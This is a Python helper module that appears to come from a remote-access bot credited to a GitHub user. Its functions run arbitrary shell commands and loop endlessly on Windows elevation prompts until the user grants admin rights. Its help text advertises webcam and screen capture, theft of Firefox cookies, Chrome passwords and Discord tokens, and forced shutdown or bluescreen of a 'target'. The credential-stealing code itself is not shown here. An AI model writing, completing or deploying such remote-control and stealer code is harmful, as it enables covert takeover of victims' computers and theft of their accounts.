import subprocess
import os
import sys
import ctypes
def run_shell(command)->str:
    c = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate(timeout=len(command))
    if c[0]:
        o = "{}".format(c[0].decode("utf-8"))
    if c[1]:
        o = "{}".format(c[1].decode("utf-8"))
    for d in [o[i:i+2000] for i in range(0, len(o), 2000)]:
        return d
def long_run_shell(command)->str:
    def repeats(string):
        for x in range(1, len(string)):
            substring = string[:x]
            if substring * (len(string)//len(substring))+(substring[:len(string)%len(substring)]) == string:
                return substring
        return string
    c = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate(timeout=len(command))
    if c[0]:
        o = "{}".format(c[0].decode("utf-8"))
    if c[1]:
        o = "{}".format(c[1].decode("utf-8"))
    if(len(o) > 2000):
        o = repeats(o)
    for d in [o[i:i+2000] for i in range(0, len(o), 2000)]:
        yield d
def pretty_printer(str_t):
    eq = "=" * len(str_t)
    f_str = "%s\n%s\n%s\n\n" % (eq, str_t, eq)
    return f_str
def pretty_printer2(str_t, size_t):
    eq = "=" * size_t
    f_str = "%s\n%s\n%s" % (eq, str_t, eq)
    return f_str
def remove_repeating(thelist: list):
    return list(dict.fromkeys(thelist))
def is_user_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0
def copy_file(the_file, directory):
    the_file = str(the_file)
    directory = str(directory)
    with open(the_file, 'rb') as fb:
        bak = fb.read()
        with open(directory, 'wb') as fd:
            fd.write(bak)
            fd.close()
        fb.close()
    return os.path.abspath(directory)
def run_as(the_file):
    if is_user_admin() is False:
        while True:
            try:
                os.startfile(the_file, 'runas')
            except:
                pass
            else:
                sys.exit()
                exit()
def SendMessageBox(Message):
	ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)
def help_command():
    a =  """
BOT MADE BY **@cpueasy** on github! 💻
GENERIC:
```
/help - prints this text
/cleantmp - clean up tmp directory
/cmd  - runs shell cmd
/screen - sends screenshot
/webcam - takes webcam photo
```
STEALERS
```
/firefoxc - firefox cookies
/chrome - chrome passwords
/discord - discord tokens
```
COMPUTER CONTROL:
```
/shutdown - shutsdown target
/restart - restarts target
/logoff - logoff target
/bsod - bluescreen target
```
        """
    return a